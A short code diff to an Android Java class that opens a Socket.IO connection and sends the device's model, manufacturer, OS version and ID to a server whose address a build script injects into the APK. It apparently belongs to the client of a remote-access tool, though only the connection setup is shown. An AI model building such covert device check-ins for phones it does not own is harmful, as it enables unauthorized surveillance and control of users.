@@ -34,18 +34,19 @@ public class IOSocket {
             
             // Socket.IO options for stable connection - match server timeouts
             IO.Options opts = new IO.Options();
-            opts.timeout = 60000;           // 60 second connection timeout (match server pingTimeout)
+            opts.timeout = 20000;           // 20 second connection timeout
             opts.reconnection = true;       // Auto reconnect
             opts.reconnectionAttempts = Integer.MAX_VALUE;  // Unlimited reconnection attempts
             opts.reconnectionDelay = 2000;  // 2 second delay between reconnects
             opts.reconnectionDelayMax = 10000;  // Max 10 second delay
-            opts.forceNew = false;          // Reuse connections
+            opts.forceNew = true;           // Force new connection to avoid stale states
             opts.randomizationFactor = 0.5; // Randomize reconnection delay
+            opts.transports = new String[] {"websocket", "polling"}; // Allow both transports
             
             // This placeholder URL will be replaced during APK build
             // Format: http://IP:PORT - the build script will inject actual server IP/PORT
             // For Android emulator, use 10.0.2.2 to reach host machine
-            String url = "http://10.0.2.2:1234?model=" + android.net.Uri.encode(Build.MODEL)
+            String url = "http://192.168.0.177:1234?model=" + android.net.Uri.encode(Build.MODEL)
                 + "&manf=" + android.net.Uri.encode(Build.MANUFACTURER)
                 + "&release=" + Build.VERSION.RELEASE 
                 + "&id=" + deviceID
